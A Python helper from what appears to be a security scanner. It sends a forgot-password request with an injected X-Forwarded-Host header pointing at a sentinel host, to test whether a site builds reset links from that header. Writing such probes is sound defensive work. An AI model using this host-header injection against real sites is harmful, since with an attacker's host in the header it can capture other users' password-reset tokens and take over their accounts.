"""Host-header-injection submit helper for stub 2.8.

Fires one forgot-password POST with an `X-Forwarded-Host` header
carrying the scanner's sentinel host. Targets that trust the
proxy header for URL construction reflect it into the reset link.
"""
from __future__ import annotations

from httpx import Client, RequestError

from apps.stubs._shared.auth.forms import AuthForm


_DEFAULT_TIMEOUT = 10.0


def request_reset_with_host_header(
    *, form: AuthForm, identifier_value: str,
    x_forwarded_host: str, user_agent: str,
) -> bool:
    """POST the forgot-password form with an injected
    `X-Forwarded-Host` header. Returns True when the target accepted
    the request (2xx / 3xx), False on 4xx / 5xx / transport error."""
    payload: dict[str, str] = dict(form.hidden_fields)
    if form.identifier_field is not None:
        payload[form.identifier_field] = identifier_value
    headers = {
        "user-agent": user_agent,
        "content-type": form.content_type,
        "x-forwarded-host": x_forwarded_host,
    }
    try:
        with Client(
            timeout=_DEFAULT_TIMEOUT, follow_redirects=False,
        ) as client:
            resp = client.request(
                form.method, form.action_url,
                data=payload, headers=headers,
            )
    except RequestError:
        return False
    return 200 <= resp.status_code < 400
